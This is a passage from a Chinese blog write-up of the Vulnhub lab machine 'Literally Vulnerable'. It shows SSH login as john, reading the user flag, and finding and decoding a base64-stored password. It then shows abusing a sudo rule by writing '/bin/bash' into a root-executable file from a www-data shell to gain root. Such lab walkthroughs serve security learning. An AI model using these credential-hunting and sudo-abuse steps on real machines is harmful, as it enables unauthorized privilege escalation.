</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>然后在本地应该就可以无密码连上ssh了</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">ssh</span> john@192.168.31.166
john@literallyvulnerable:~$ 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>拿到了完整的shell和john的用户权限</p> <p>可以读到第一个flag了</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>john@literallyvulnerable:~$ <span class="token function">cat</span> user.txt 
Almost there<span class="token operator">!</span> Remember to always check permissions<span class="token operator">!</span> It might not <span class="token builtin class-name">help</span> you here, but somewhere else<span class="token operator">!</span> <span class="token punctuation">;</span><span class="token punctuation">)</span> 
Flag: iuz1498ne667ldqmfarfrky9v5ylki
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>接下来怎么做呢，</p> <p>sudo -l 行不通 因为还是没有john的密码</p> <p>一通fuzz</p> <p>发现一个有趣的东西</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>john@literallyvulnerable:~$ <span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-type</span> f <span class="token parameter variable">-iname</span> <span class="token string">&quot;*password*&quot;</span>
./.local/share/tmpFiles/myPassword
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>cat 一下</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">cat</span> ./.local/share/tmpFiles/myPassword
I always forget my password, so, saving it here just <span class="token keyword">in</span> case. Also, encoding it with b64 since I don't want my colleagues to hack me<span class="token operator">!</span>
<span class="token assign-left variable">am9objpZWlckczhZNDlJQiNaWko</span><span class="token operator">=</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>base64解码完是个</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>john:YZW$s8Y49IB#ZZJ
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>拿到密码了</p> <p>sudo -l一下</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>john@literallyvulnerable:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> john: 
Matching Defaults entries <span class="token keyword">for</span> john on literallyvulnerable:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin

User john may run the following commands on literallyvulnerable:
    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> /var/www/html/test.html
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>可以执行/var/www/html/test.html</p> <p>可是这个文件不存在....</p> <p>而且john写不了这个文件....</p> <p>但是之前拿到的www-data的shell可以写啊！</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>www-data@literallyvulnerable:<span class="token variable"><span class="token variable">$(</span>/bin/bash<span class="token variable">)</span></span>$ <span class="token builtin class-name">echo</span> <span class="token string">&quot;/bin/bash&quot;</span> <span class="token operator">&gt;</span> /var/www/html/test.html
<span class="token operator">&lt;</span>n/bash<span class="token punctuation">)</span>$ <span class="token builtin class-name">echo</span> <span class="token string">&quot;/bin/bash&quot;</span> <span class="token operator">&gt;</span> /var/www/html/test.html
www-data@literallyvulnerable:<span class="token variable"><span class="token variable">$(</span>/bin/bash<span class="token variable">)</span></span>$ <span class="token function">chmod</span> <span class="token number">777</span> /var/www/html/test.html
<span class="token function">chmod</span> <span class="token number">777</span> /var/www/html/test.html

john@literallyvulnerable:~$ <span class="token function">sudo</span> /var/www/html/test.html
root@literallyvulnerable:~<span class="token comment">#</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>完工！</p> <p>不过看起来像个非预期解，因为/doe/local.txt的flag没有用上....</p> <h2 id="参考资料"><a href="#参考资料" class="header-anchor">#</a> 参考资料</h2> <p>Nmap 各参数详解：https://blog.csdn.net/SKI_12/article/details/61651960</p> <p>记一份基础Metasploit教程：https://xz.aliyun.com/t/3007</p> <p>msf工具使用参考：https://g2ex.top/2015/06/09/MSF-Cheat-Sheet/</p> <p>find工具使用参考：https://www.jianshu.com/p/4a5d904e38c7</p></div></div>  <div class="page-edit"><div class="edit-link"><a href="https://github.com/EkiXu/blog/edit/master/docs/Vulnhub Walk Through/03.ua-literally-vulnerable.md" target="_blank" rel="noopener noreferrer">编辑</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <!----> <div class="last-updated"><span class="prefix">上次更新:</span> <span class="time">2021/05/11, 08:36:49</span></div></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/a12e91/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">five86-1</div></a> <a href="/pages/8698b9/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">wakanda</div></a></div> <div class="page-nav"><p class="inner"><span class="prev">
        ←
        <a href="/pages/a12e91/" class="prev">five86-1</a></span> <span class="next"><a href="/pages/8698b9/">wakanda</a>→
      </span></p></div></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">最近更新</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/qwb2022final/"><div>
            QWB CTF2022 线下赛总决赛部分题解
            <!----></div></a> <span class="date">08-25</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/ciscn2022final/"><div>
            CISCN2022 总决赛部分题解
            <!----></div></a> <span class="date">08-25</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/dsctf2022_final/"><div>
            DSCTF2022决赛 部分writeup
            <!----></div></a> <span class="date">08-08</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">更多文章&gt;</a></dt></dl></div></div></main></div> <div class="footer"><div class="icons"><a href="mailto:ekixu@qq.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/EkiXu" title="GitHub" target="_blank" class="iconfont icon-github"></a></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2019-2022
    <span>EkiXu | <a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by/4.0/88x31.png" /></a><br />This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
          跟随系统
        </li><li class="iconfont icon-rijianmoshi">
          浅色模式
        </li><li class="iconfont icon-yejianmoshi">
          深色模式
        </li><li class="iconfont icon-yuedu">
          阅读模式
        </li></ul></div></div> <div class="body-bg" style="background:url() center center / cover no-repeat;opacity:0.5;"></div> <!----> <!----></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.8153bfb8.js" defer></script><script src="/assets/js/2.236d623d.js" defer></script><script src="/assets/js/63.27f549f4.js" defer></script>
  </body>
</html>
